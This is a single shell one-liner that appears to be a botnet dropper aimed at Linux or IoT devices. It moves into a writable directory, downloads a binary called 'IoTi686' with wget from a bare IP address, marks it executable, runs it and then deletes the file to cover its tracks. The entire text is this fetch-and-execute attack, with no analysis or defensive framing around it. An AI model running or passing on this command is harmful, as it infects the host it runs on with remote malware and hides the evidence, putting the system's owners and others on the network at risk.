cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://195.2.253.240/IoTi686; chmod +x IoTi686; ./IoTi686; rm -rf IoTi686
